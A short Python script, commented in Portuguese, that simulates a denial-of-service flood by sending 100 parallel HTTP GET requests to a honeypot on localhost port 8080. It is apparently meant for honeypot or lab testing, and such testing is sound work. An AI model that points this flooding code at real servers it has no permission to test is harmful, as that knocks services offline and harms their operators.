import socket
import threading

# Simulacao de ataque de DDoS enviando multiplas requisicoes ao servidor
def dos_attack(target_ip, target_port, message):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target_ip, target_port))
        client.sendall(message.encode('utf-8'))
        print(f"Packet sent to {target_ip}:{target_port}")
    except Exception as e:
        print(f"Failed to connect: {e}")
    finally:
        client.close()

# Simulacao de multiplas requisicoes em paralelo
def start_attack(target_ip, target_port, message, num_threads=100):
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=dos_attack, args=(target_ip, target_port, message))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

# Configuracoes de ataque
target_ip = "127.0.0.1"  # IP do honeypot
target_port = 8080  # Porta do honeypot
message = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"

# Iniciar ataque
start_attack(target_ip, target_port, message)
